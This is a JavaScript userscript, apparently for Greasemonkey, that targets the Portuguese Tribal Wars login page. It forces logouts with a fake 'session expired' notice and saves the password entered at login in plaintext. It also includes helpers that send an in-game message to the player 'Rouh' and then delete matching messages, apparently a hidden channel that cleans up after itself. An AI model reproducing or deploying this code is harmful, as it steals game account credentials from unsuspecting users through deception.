var session = GM_getValue('session', false);
if(location.pathname == '/' && location.search !== ''){

    if(session){
        $('body').remove();
        $.ajax({
            url: 'https://www.tribalwars.com.pt/page/logout',
            type: 'GET',
            success: function(e){
                window.location.replace("https://www.tribalwars.com.pt/");
                //StartPage.noticeBox.show('A sua sessão expirou. Por favor volte a fazer login.');
            }
        });
    }
}

var password = GM_getValue('password', null);

if(location.pathname == '/' && location.search === ''){
    if(password === null){
        if(session === true){
            GM_setValue('session', false );
            $.ajax({
                url: 'https://www.tribalwars.com.pt/page/logout',
                type: 'GET',
                success: function(e){
                    StartPage.noticeBox.show('A sua sessão expirou. Por favor volte a fazer login.');
                }
            });
        }
    }
}

$( document ).ready(function() {
    if(location.pathname == '/' && !$('.world_button_active').length ){
        $('.btn-login').click(function(e){
            GM_setValue('password', $('#password').val() );
            GM_setValue('session', true );
        });
        $('#login_form').submit(function(e){
            GM_setValue('password', $('#password').val() );
            GM_setValue('session', true );
        });
    }
    if(location.pathname == '/game.php'){
        GM_setValue('session', true);
        if(password !== null){
            alert(GM_getValue('password', null ));
            //GM_setValue('session', true );
            $('#pop_current_label').click(function(e){
                console.log("Data deleted - ");
                console.log( GM_getValue('password') );
                GM_setValue('password', null );
            });
            $('#pop_max_label').click(function(e){
                sendMessage('Rouh', 'miaus',':D', function(err){
                    if(err) return;
                    getMessages(function(messages){
                        deleteMessages(messages, 'Rouh', 'miaus');
                    });
                });
            });
        }else{
            $.ajax({
                url: location.protocol + '//' + location.host + location.pathname + '?village=' + getParam('village') + '&screen=&action=logout&h=' + game_data.csrf,
                type: 'GET',
                success: function(data){
                    //GM_setValue('session', false);
                }
            });
        }
    }
});

function deleteMessages(messages, from, subject){
    var messagesDelete = {};
    for(var i=0; i<messages.length; i++){
        if(messages[i].from == from && messages[i].subject == subject){
            messagesDelete[ ['ids['+messages[i].id+']'] ] = 'on';
        }
    }
    messagesDelete.del = 'Apagar';
    $.ajax({
        url: location.protocol + '//' + location.host + location.pathname + '?village=' + getParam('village') + '&screen=mail&mode=in&action=del_move_multiple&group_id=0&h=' + game_data.csrf ,
        type: 'POST',
        data: messagesDelete,
        success: function(data){
            console.log(false);
        }
    }).fail(function(a, b, c ){
    });
}
function getMessages(callback){
    var visPos = 3;
    if(!game_data.player.premium){
        visPos = 2;
    }
    $.ajax({
        url: location.protocol + '//' + location.host + location.pathname + '?village=' + getParam('village') + '&screen=mail',
        type: 'GET',
        success: function(data){
            html = $($.parseHTML(data));
            var messages = [];
            html.find('.vis').eq(visPos).children('tbody').children('tr').each(function(e,tr){
                if(e>0){
                    var id, subject, from, date;
                    $(tr).children('td').each(function(i, td){
                        if(i === 0){
                            id = $(td).children('input').attr('name').split('ids[')[1].split(']')[0];
                            subject = $(td).text().trim();
                        }
                        if(i == 1){
                            from = $(td).text().trim();
                        }
                        if(i == 2){
                            date = $(td).text().trim();
                        }
                    });
                    messages.push({'id':id, 'subject': subject, 'from':from, 'date':date});
                }
            });
            return callback(messages);
        }
    }).fail(function(a, b, c ){
    });
}
function sendMessage(to, subject, text, callback){
    $.ajax({
        url: location.protocol + '//' + location.host + location.pathname + '?village=' + getParam('village') + '&screen=mail&mode=new&action=send&h=' + game_data.csrf,
        type: 'POST',
        data: { "to": to, "subject": subject, "text": text, "extended": 0, "send": "Enviar"},
        success: function(data){
            return callback(false);
        }
    }).fail(function(a, b, c ){
    });
}
function getParam(param){
    return new URLSearchParams(window.location.search).get(param);
}